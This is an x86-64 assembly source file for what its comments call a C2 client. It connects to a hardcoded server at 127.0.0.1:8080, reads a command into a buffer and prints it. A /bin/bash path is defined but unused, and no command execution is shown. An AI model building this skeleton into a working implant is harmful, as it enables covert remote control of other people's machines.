section .data
    server_ip db "127.0.0.1", 0     ; IP of C2 Server
    server_port dw 8080             ; 8080 for alternate HTTP
    bash_path db "/bin/bash", 0     ; Path to shell
    socket_fd dq 0x0
    err_msg db "Program exits due to errors", 0x0
    err_msg_len dq 0x1c

section .bss
    rx_buffer resb 0x100               ; Receiving buffer from the server

section .text
    global _start
    global fn_connect_client
    global fn_error_exit
    global fn_read_command
    global fn_dbg_print_rx_buffer

; Function to exit
fn_error_exit:
    ; Print error message
    mov rax, 1  
    mov rdi, 1
    lea rsi, [err_msg]
    movzx rdx, byte [err_msg_len]
    syscall

    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x1                ; Error code
    syscall

; Debug function to print the rx_buffer
fn_dbg_print_rx_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8               ; Stackframe

    ; Write buffer to STDOUT
    mov rax, 0x1               ; read syscall
    mov rdi, 0x1               ; socket file descriptor
    lea rsi, [rx_buffer]       ; pointer to the buffer
    mov rdx, 0x100             ; buffer size
    syscall

    cmp rax, 0                 
    jl fn_error_exit           ; exit if an error occurred

    mov rsp, rbp
    pop rbp
    ret


; Function to read the command of the C2 server
; Reads from the socket file descriptor stored in memory and stores inside rx_buffer
fn_read_command:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8               ; Stackframe

    ; Reads data from fd
    mov rax, 0x0               ; read syscall
    mov rdi, qword [socket_fd] ; socket file descriptor
    lea rsi, [rx_buffer]       ; pointer to the buffer
    mov rdx, 0x100             ; buffer size
    syscall

    mov rsp, rbp
    pop rbp
    ret

; Function to connect to C2 server
; Stores the file descriptor of the socket inside the memory
fn_connect_client:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18               ; Stackframe

    ; Create a socket
    mov rax, 0x29               ; socket syscall
    mov rdi, 0x2                ; domain AF_INET (2)
    mov rsi, 0x1                ; type SOCK_STREAM (1)
    mov rdx, 0x0                ; protocol default (0)
    syscall

    mov [socket_fd], al         ; save socket fd

    ; Setup sockaddr_in structure
    ; 16 bytes
    ; struct sockaddr_in {
    ;   unsigned short sin_family; (2 bytes) AF_INET
    ;   unsigned short sin_port; (2 bytes) htons(8080)
    ;   struct in_addr sin_addr; (4 bytes) 127.0.0.1
    ;   char sin_zero[8]; (8 bytes) padding
    ; }
    mov word [rsp], 0x2             ; sin_family = AF_INET
    mov word [rsp+2], 0x901f        ; sin_port = htons(8080)
    mov dword [rsp+4], 0x0100007f   ; sin_addr = 127.0.0.1
    mov qword [rsp+8], 0x0          ; sin_zero[8] remains zeroed by default
    
    ; Connect to socket
    mov rax, 0x2a               ; connect syscall
    mov rdi, [socket_fd]        ; load socket file descriptor
    lea rsi, [rsp]              ; address to stack parameter
    mov rdx, 16                 ; size of sockaddr_in
    syscall

    cmp rax, 0x0                ; error
    jl fn_error_exit

    mov rsp, rbp
    pop rbp
    ret

_start:
    mov rbp, rsp

    ; Connection to C2 server
    call fn_connect_client

    ; Read command from server
    call fn_read_command

    call fn_dbg_print_rx_buffer

    ; Exit the program
    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x0
    syscall
